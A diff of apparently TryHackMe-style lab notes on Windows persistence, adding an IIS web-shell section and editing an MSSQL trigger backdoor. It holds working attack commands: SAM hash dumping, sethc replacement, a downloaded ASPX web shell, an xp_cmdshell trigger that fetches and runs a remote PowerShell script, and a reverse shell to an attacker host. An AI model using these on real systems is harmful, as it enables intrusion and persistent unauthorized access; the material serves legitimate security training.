@@ -91,7 +91,7 @@ With those files, we can dump the password hashes for all users using `secretsdu
 python3.9 /opt/impacket/examples/secretsdump.py -sam sam.bak -system system.bak LOCAL
 ```
 
-<figure><img src="../../.gitbook/assets/image (3) (11).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../.gitbook/assets/image (3) (11) (1).png" alt=""><figcaption></figcaption></figure>
 
 And finally, perform Pass-the-Hash to connect to the victim machine with Administrator privileges.
 
@@ -658,7 +658,7 @@ Note: While both `shell` and `Userinit` could be used to achieve persistence in 
 
 Add: C:\Windows\revshell.exe
 
-<figure><img src="../../.gitbook/assets/image (3).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../.gitbook/assets/image (3) (11).png" alt=""><figcaption></figcaption></figure>
 
 After doing this, sign out of your current session and log in again, and you should receive a shell (it will probably take around 10 seconds).
 
@@ -711,7 +711,7 @@ To create an environment variable for a user, you can go to its `HKCU\Environmen
 <pre><code><strong>regedit
 </strong></code></pre>
 
-<figure><img src="../../.gitbook/assets/image (4).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../.gitbook/assets/image (4) (1).png" alt=""><figcaption></figcaption></figure>
 
 Notice that this registry key has no equivalent in HKLM, making your backdoor apply to the current user only.
 
@@ -779,7 +779,7 @@ icacls C:\Windows\System32\sethc.exe /grant Administrator:F
 copy c:\Windows\System32\cmd.exe C:\Windows\System32\sethc.exe
 ```
 
-<figure><img src="../../.gitbook/assets/image (2).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../.gitbook/assets/image (2) (10).png" alt=""><figcaption></figcaption></figure>
 
 After doing so, lock your session from the start menu.
 
@@ -793,7 +793,7 @@ You should now be able to press `SHIFT` five times to access a terminal with SYS
 
 Utilman is a built-in Windows application used to provide Ease of Access options during the lock screen.
 
-<figure><img src="../../.gitbook/assets/image.png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../.gitbook/assets/image (4).png" alt=""><figcaption></figcaption></figure>
 
 
 
@@ -821,7 +821,50 @@ And finally, proceed to click on the "Ease of Access" button. Since we replaced 
 
 <figure><img src="../../.gitbook/assets/image (23).png" alt=""><figcaption></figcaption></figure>
 
+##
+
 ## Persisting Through Existing Services
+
+If you don't want to use Windows features to hide a backdoor, you can always profit from any existing service that can be used to run code for you. This task will look at how to plant backdoors in a typical web server setup. Still, any other application where you have some degree of control on what gets executed should be backdoorable similarly. The possibilities are endless!
+
+### Using Web Shells
+
+The usual way of achieving persistence in a web server is by uploading a web shell to the web directory. This is trivial and will grant us access with the privileges of the configured user in IIS, which by default is `iis apppool\defaultapppool`. Even if this is an unprivileged user, it has the special `SeImpersonatePrivilege`, providing an easy way to escalate to the Administrator using various known exploits. For more information on how to abuse this privilege, see the [Windows Privesc Room](https://tryhackme.com/room/windowsprivesc20).
+
+Let's start by downloading an ASP.NET web shell. A ready to use web shell is provided [here](https://github.com/tennc/webshell/blob/master/fuzzdb-webshell/asp/cmdasp.aspx), but feel free to use any you prefer. Transfer it to the victim machine and move it into the webroot, which by default is located in the `C:\inetpub\wwwroot` directory.
+
+**Kali**
+
+```
+curl https://raw.githubusercontent.com/tennc/webshell/master/fuzzdb-webshell/asp/cmdasp.aspx -o shell.aspx 
+python3 -m http.server
+```
+
+**Victim(powershell)**
+
+<pre><code>wget http://$KALI:8000/shell.aspx -O shell.aspx
+move shell.aspx C:\inetpub\wwwroot\
+<strong>cd C:\inetpub\wwwroot\
+</strong>icacls shell.aspx /grant Everyone:F
+</code></pre>
+
+
+
+Note: Depending on the way you create/transfer `shell.aspx`, the permissions in the file may not allow the web server to access it. If you are getting a Permission Denied error while accessing the shell's URL, just grant everyone full permissions on the file to get it working. You can do so with `icacls shell.aspx /grant Everyone:F`.
+
+We can then run commands from the web server by pointing to the following URL:
+
+`http://$VICTIM/shell.aspx`
+
+<figure><img src="../../.gitbook/assets/image (97).png" alt=""><figcaption></figcaption></figure>
+
+
+
+
+
+While web shells provide a simple way to leave a backdoor on a system, it is usual for blue teams to check file integrity in the web directories. Any change to a file in there will probably trigger an alert.
+
+### Using MSSQL as a Backdoor
 
 There are several ways to plant backdoors in MSSQL Server installations. For now, we will look at one of them that abuses triggers. Simply put, **triggers** in MSSQL allow you to bind actions to be performed when specific events occur in the database. Those events can range from a user logging in up to data being inserted, updated or deleted from a given table. For this task, we will create a trigger for any INSERT into the `HRDB` database.
 
@@ -829,7 +872,9 @@ Before creating the trigger, we must first reconfigure a few things on the datab
 
 To enable it, let's open `Microsoft SQL Server Management Studio 18`, available from the start menu. When asked for authentication, just use **Windows Authentication** (the default value), and you will be logged on with the credentials of your current Windows User. By default, the local Administrator account will have access to all DBs.
 
-Once logged in, click on the New Query button to open the query editor.
+Once logged in, click on the New Query button to open the query editor:
+
+<figure><img src="../../.gitbook/assets/image (3).png" alt=""><figcaption></figcaption></figure>
 
 Run the following SQL sentences to enable the "Advanced Options" in the MSSQL configuration, and proceed to enable `xp_cmdshell`.
 
@@ -865,15 +910,13 @@ ON HRDB.dbo.Employees
 FOR INSERT AS
 
 EXECUTE AS LOGIN = 'sa'
-EXEC master..xp_cmdshell 'Powershell -c "IEX(New-Object net.webclient).downloadstring(''http://ATTACKER_IP:8000/evilscript.ps1'')"';
+EXEC master..xp_cmdshell 'Powershell -c "IEX(New-Object net.webclient).downloadstring(''http://$KALI:8000/evilscript.ps1'')"';
 ```
 
 Now that the backdoor is set up, let's create `evilscript.ps1` in our attacker's machine, which will contain a Powershell reverse shell.
 
-**evilscript.ps1**
-
 ```
-$client = New-Object System.Net.Sockets.TCPClient("ATTACKER_IP",4454);
+$client = New-Object System.Net.Sockets.TCPClient("$KALI",4454);
 
 $stream = $client.GetStream();
 [byte[]]$bytes = 0..65535|%{0};
@@ -906,7 +949,10 @@ python3 -m http.server
 nc -lvp 4454
 ```
 
-With all that ready, let's navigate to `http://MACHINE_IP/` and insert an employee into the web application. Since the web application will send an INSERT statement to the database, our TRIGGER will provide us access to the system's console.
+With all that ready, let's navigate to `http://$VICTIM/` and insert an employee into the web application. Since the web application will send an INSERT statement to the database, our TRIGGER will provide us access to the system's console.
 
-##
+<figure><img src="../../.gitbook/assets/image (10).png" alt=""><figcaption></figcaption></figure>
 
+
+
+<figure><img src="../../.gitbook/assets/image (2).png" alt=""><figcaption></figcaption></figure>
